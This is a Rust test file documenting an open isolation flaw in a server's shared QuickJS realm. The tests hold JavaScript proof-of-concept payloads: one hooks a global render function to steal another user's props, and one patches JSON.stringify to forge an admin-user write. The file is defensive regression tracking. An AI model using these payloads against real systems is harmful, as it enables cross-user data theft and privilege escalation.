//! 🔴 **These tests assert a leak that is OPEN.** They document, executably,
//! what an npm package can do to the server's shared QuickJS realm.
//!
//! **If one of these starts failing, the leak was closed — invert the assertion
//! rather than deleting the test.** They exist because the finding is easy to
//! state and easy to disbelieve, and re-deriving it from scratch costs an hour.
//!
//! ## The setup that makes it reachable
//!
//! Pooled engines (`crates/albedo-server/src/engine_pool.rs`) are created once,
//! warmed, and **reused for every request for the process's life** — the arena
//! discipline requires it (`ARENA_WARMUP_RENDERS`). `install_npm_bundles`
//! registers the project's packages on **every** engine in that pool, and the
//! same engines serve Tier-B renders *and* QuickJS actions. So one JS realm
//! spans every request and every principal, and third-party package code lives
//! in it.
//!
//! ## What that falsifies
//!
//! `FLOOR.md` makes two claims this contradicts:
//!
//! 1. *"A floor function runs with exactly the requesting principal's authority
//!    ⇒ it cannot reach data the caller could not ⇒ adding one cannot widen the
//!    attack surface at all."* — 🔴 False for anything sharing the realm. The
//!    realm outlives the request, so package code runs with **every** principal's
//!    authority in turn.
//! 2. *"Enforcement is at the effect, not the syntax — `__albedo_effects` is the
//!    only exit this runtime has, so no amount of dynamic code escapes it."* —
//!    🔑 The exit is real, but it is **unauthenticated**. The array is handed to
//!    Rust by `JSON.stringify` (a mutable intrinsic) and `bridge::lower_effect`
//!    dispatches on `kind` alone. An effect carries **no provenance**, so a
//!    forged one is indistinguishable from one the `append` shim pushed.
//!    Enforcement-at-the-effect is sound only if the effect stream's *integrity*
//!    is, and it is not.
//!
//! ⚖️ **Not worse than the incumbent.** A malicious package in Next.js gets
//! `fs`/`net`/`child_process` — strictly more. What is new is that Albedo
//! *claims* the property these tests break.
//!
//! 🪤 **The CJS wrapper's `global` parameter is NOT the cause.** It is a
//! redundant alias: `globalThis` is a nameable intrinsic and
//! `Function('return this')()` works too (see
//! [`the_global_parameter_is_a_redundant_alias`]). Removing it fixes nothing.

use dom_render_compiler::bundler::npm::{bundle_npm_dependency, NpmDependencyBundle, ShakeOptions};
use dom_render_compiler::runtime::engine::{BootstrapPayload, RuntimeEngine};
use dom_render_compiler::runtime::quickjs_engine::QuickJsEngine;
use dom_render_compiler::runtime::{HandlerEffect, HandlerInvocation};
use std::path::Path;

/// The option set the server actually bundles with.
fn server_options() -> ShakeOptions {
    dom_render_compiler::bundler::client_npm::server_shake_options()
}

fn engine() -> QuickJsEngine {
    let mut engine = QuickJsEngine::new();
    engine.init(&BootstrapPayload::default()).expect("init");
    engine
}

fn load_bundle(engine: &mut QuickJsEngine, bundle: &NpmDependencyBundle) {
    for artifact in &bundle.artifacts {
        engine
            .load_precompiled_module(&artifact.key, &artifact.script, artifact.source_hash)
            .unwrap_or_else(|err| panic!("loading '{}': {err}", artifact.key));
    }
}

fn write(path: &Path, content: &str) {
    std::fs::create_dir_all(path.parent().expect("parent")).expect("mkdir");
    std::fs::write(path, content).expect("write");
}

/// Build a one-file package whose body runs when it is first required, and load
/// it into `engine` behind a component that imports it.
fn run_package_during_a_render(engine: &mut QuickJsEngine, name: &str, body: &str) -> String {
    let dir = tempfile::tempdir().expect("tempdir");
    let pkg = dir.path().join("node_modules").join(name);
    write(
        &pkg.join("package.json"),
        &format!(r#"{{ "name": "{name}", "version": "1.0.0", "main": "./index.js" }}"#),
    );
    write(&pkg.join("index.js"), body);

    let bundle = bundle_npm_dependency(dir.path(), name, &server_options()).expect("bundle");
    load_bundle(engine, &bundle);
    let module = format!("routes/{name}.tsx");
    engine
        .load_module(
            &module,
            &format!(
                r#"import {{ tag }} from "{name}";
                   export default function A() {{ return <i>{{tag}}</i>; }}"#
            ),
        )
        .expect("attacker module loads");
    engine
        .render_component(&module, "{}")
        .expect("attacker renders")
        .html
}

/// `global` adds nothing: the realm is reachable three other ways.
#[test]
fn the_global_parameter_is_a_redundant_alias() {
    let mut engine = engine();
    let html = run_package_during_a_render(
        &mut engine,
        "reach",
        r#"
        var viaParam = (typeof global !== 'undefined');
        var viaIntrinsic = (typeof globalThis !== 'undefined');
        var viaFunction = false;
        try { viaFunction = (Function('return this')() === globalThis); } catch (e) {}
        module.exports = { tag: JSON.stringify({ viaParam: viaParam, viaIntrinsic: viaIntrinsic, viaFunction: viaFunction }) };
        "#,
    );
    assert!(html.contains(r#""viaParam":true"#), "{html}");
    assert!(
        html.contains(r#""viaIntrinsic":true"#),
        "globalThis is an intrinsic — dropping the `global` parameter would change nothing: {html}"
    );
    assert!(html.contains(r#""viaFunction":true"#), "{html}");
}

/// A package that ran during one render observes the **props of a later
/// render** — a different component, a different principal — by wrapping `h`.
#[test]
fn a_package_can_read_a_later_renders_props() {
    let mut engine = engine();
    run_package_during_a_render(
        &mut engine,
        "peeker",
        r#"
        if (!globalThis.__stolen) {
          globalThis.__stolen = [];
          var realH = globalThis.h;
          globalThis.h = function () {
            try { globalThis.__stolen.push(JSON.stringify(arguments[1])); } catch (e) {}
            return realH.apply(this, arguments);
          };
        }
        module.exports = { tag: 'installed' };
        "#,
    );

    engine
        .load_module(
            "routes/victim.tsx",
            r#"export default function V(props) { return <b data-secret={props.secret}>{props.secret}</b>; }"#,
        )
        .expect("victim loads");
    engine
        .render_component("routes/victim.tsx", r#"{"secret":"alice-private-token"}"#)
        .expect("victim renders");

    engine
        .load_module(
            "routes/readback.tsx",
            r#"export default function R() {
                 return <pre>{(globalThis.__stolen || []).join(" ~ ")}</pre>;
               }"#,
        )
        .expect("readback loads");
    let stolen = engine
        .render_component("routes/readback.tsx", "{}")
        .expect("readback renders")
        .html;

    assert!(
        stolen.contains("alice-private-token"),
        "🔴 OPEN LEAK: a package read another render's props. If this now fails, \
         the realm was isolated — invert the assertion. Got: {stolen}"
    );
}

/// The claim with teeth: a package forges a **durable write** into the effect
/// stream of a handler that wrote nothing.
///
/// 🔑 `bridge::lower_effect` dispatches on `kind` and validates *shape*, not
/// *origin* — its own comment calls itself "the trust boundary for anything that
/// reached us anyway". `apply_writes` then authorizes the forged write against
/// **the principal of whichever request it rode in on**.
#[test]
fn a_package_can_forge_a_durable_write_into_someone_elses_handler() {
    let mut engine = engine();
    run_package_during_a_render(
        &mut engine,
        "forger",
        r#"
        var real = JSON.stringify;
        JSON.stringify = function (value) {
          if (Array.isArray(value)) {
            value = value.concat([{ kind: 'forge_append', topic: 'albedo_users',
                                    value: { email: 'attacker@evil.test', role: 'admin' } }]);
            return real.call(JSON, value);
          }
          return real.apply(JSON, arguments);
        };
        module.exports = { tag: 'forger' };
        "#,
    );

    // A later handler whose body cannot write anything at all.
    let env = serde_json::Map::new();
    let invocation = HandlerInvocation {
        body: "1 + 1",
        is_block: false,
        env: &env,
        raw_bindings: &[],
        setters: &[],
        event_json: None,
        broadcast_current: &[],
        journal: None,
    };
    let outcome = engine
        .eval_handler("routes/victim.tsx", &invocation)
        .expect("handler runs");

    let forged = outcome.effects.iter().any(|effect| {
        matches!(effect, HandlerEffect::ForgeAppend { collection, .. } if collection == "albedo_users")
    });
    assert!(
        forged,
        "🔴 OPEN LEAK: `1 + 1` produced a durable write to albedo_users. If this now \
         fails, the effect stream gained integrity — invert the assertion. Got: {:?}",
        outcome.effects
    );
}

/// Nothing in the realm is frozen, which is what makes all of the above
/// possible. Recorded separately because it is the single fact a fix has to
/// change.
#[test]
fn the_realms_intrinsics_and_host_globals_are_all_writable() {
    let mut engine = engine();
    let html = run_package_during_a_render(
        &mut engine,
        "mutator",
        r#"
        var results = {};
        results.arrayPrototype = (function () {
          try { Array.prototype.__poked = 1; return Array.prototype.__poked === 1; } catch (e) { return false; }
        })();
        results.jsonStringify = (function () {
          var real = JSON.stringify; try { JSON.stringify = real; return true; } catch (e) { return false; }
        })();
        results.hostH = (function () {
          var real = globalThis.h; try { globalThis.h = real; return true; } catch (e) { return false; }
        })();
        results.moduleTable = (function () {
          try { globalThis.__ALBEDO_MODULES.__poked = 1; return true; } catch (e) { return false; }
        })();
        module.exports = { tag: JSON.stringify(results) };
        "#,
    );
    for surface in [
        "arrayPrototype",
        "jsonStringify",
        "hostH",
        "moduleTable",
    ] {
        assert!(
            html.contains(&format!(r#""{surface}":true"#)),
            "🔴 {surface} is writable by package code. If this now fails, the realm was \
             hardened — invert the assertion. Got: {html}"
        );
    }
}
